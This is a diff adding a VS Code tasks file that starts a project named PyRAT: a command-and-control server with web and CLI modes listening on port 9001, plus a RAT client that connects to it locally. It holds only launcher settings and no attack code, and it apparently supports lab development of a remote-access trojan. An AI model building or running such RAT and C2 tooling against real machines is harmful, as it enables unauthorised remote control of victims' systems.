@@ -1,0 +1,107 @@
+{
+    "version": "2.0.0",
+    "tasks": [
+        {
+            "label": "PyRAT: Start CNC Web Server",
+            "type": "shell",
+            "command": "${command:python.interpreterPath}",
+            "args": [
+                "${workspaceFolder}/Python/pyrat/cnc_server.py",
+                "--mode",
+                "web",
+                "--host",
+                "0.0.0.0",
+                "--port",
+                "9001",
+                "--web-host",
+                "127.0.0.1",
+                "--web-port",
+                "8080"
+            ],
+            "isBackground": true,
+            "problemMatcher": {
+                "pattern": {
+                    "regexp": "^$",
+                    "file": 1,
+                    "location": 2,
+                    "message": 3
+                },
+                "background": {
+                    "activeOnStart": true,
+                    "beginsPattern": "^\\[cnc\\] Listening on",
+                    "endsPattern": "^Press CTRL\\+C to quit$"
+                }
+            },
+            "presentation": {
+                "reveal": "always",
+                "panel": "dedicated",
+                "focus": false,
+                "clear": true
+            }
+        },
+        {
+            "label": "PyRAT: Start RAT Client",
+            "type": "shell",
+            "command": "${command:python.interpreterPath}",
+            "args": [
+                "${workspaceFolder}/Python/pyrat/rat.py",
+                "--host",
+                "127.0.0.1",
+                "--port",
+                "9001"
+            ],
+            "isBackground": true,
+            "problemMatcher": {
+                "pattern": {
+                    "regexp": "^$",
+                    "file": 1,
+                    "location": 2,
+                    "message": 3
+                },
+                "background": {
+                    "activeOnStart": true,
+                    "beginsPattern": "^\\[rat\\] Connected to CNC",
+                    "endsPattern": "^\\[rat\\] Connected to CNC"
+                }
+            },
+            "presentation": {
+                "reveal": "always",
+                "panel": "dedicated",
+                "focus": false,
+                "clear": true
+            },
+            "dependsOn": []
+        },
+        {
+            "label": "PyRAT: Start Both (Server + Client)",
+            "dependsOn": [
+                "PyRAT: Start CNC Web Server",
+                "PyRAT: Start RAT Client"
+            ],
+            "dependsOrder": "sequence",
+            "problemMatcher": []
+        },
+        {
+            "label": "PyRAT: Start CNC CLI Server",
+            "type": "shell",
+            "command": "${command:python.interpreterPath}",
+            "args": [
+                "${workspaceFolder}/Python/pyrat/cnc_server.py",
+                "--mode",
+                "cli",
+                "--host",
+                "0.0.0.0",
+                "--port",
+                "9001"
+            ],
+            "isBackground": false,
+            "problemMatcher": [],
+            "presentation": {
+                "reveal": "always",
+                "panel": "dedicated",
+                "focus": true,
+                "clear": true
+            }
+        }
+    ]
+}
